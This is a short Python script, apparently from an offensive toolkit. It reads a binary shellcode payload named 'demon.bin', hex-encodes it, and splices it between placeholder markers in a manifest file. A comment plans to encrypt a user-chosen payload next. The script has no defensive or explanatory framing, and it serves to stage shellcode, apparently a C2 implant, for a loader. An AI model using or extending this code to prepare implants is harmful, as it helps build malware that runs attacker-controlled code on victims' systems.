import re
import sys

def extract_and_format_shellcode(file_path):
    """
    Extracts shellcode from a binary file and converts it into a continuous hex string.
    """
    try:
        with open(file_path, 'rb') as f:  # Read as binary
            content = f.read()

        # Convert binary content to a continuous hex string
        formatted_shellcode = content.hex()

        return formatted_shellcode
    except Exception as e:
        print(f"Error reading shellcode file: {e}")
        sys.exit(1)

def replace_shellcode(manifest_path, shellcode):
    """
    Replaces the placeholder shellcode in the manifest file with the provided shellcode.
    """
    try:
        with open(manifest_path, 'r') as f:
            content = f.read()

        # Regex to find the shellcode placeholder between #! and $!
        updated_content = re.sub(
            r"#!.*\$!",
            f"#!{shellcode}$!",
            content,
            flags=re.DOTALL  # Allow multiline matching
        )

        # Write the updated content back to the file
        with open(manifest_path, 'w') as f:
            f.write(updated_content)

        print("Manifest updated successfully.")
    except Exception as e:
        print(f"Error updating manifest file: {e}")
        sys.exit(1)

if __name__ == "__main__":
    # Path to the binary shellcode file //TO-DO: Change it so it will encrypt the user's choice of the .bin payload specified in puzzle.py
    shellcode_file = "../payloads/demon.bin"
    # Path to the manifest file
    manifest_path = "manifiesto.txt"

    # Extract and format shellcode
    shellcode = extract_and_format_shellcode(shellcode_file)
    print(f"Extracted shellcode: {shellcode[:50]}...")  # Print first 50 characters for verification

    # Replace shellcode in the manifest file
    replace_shellcode(manifest_path, shellcode)
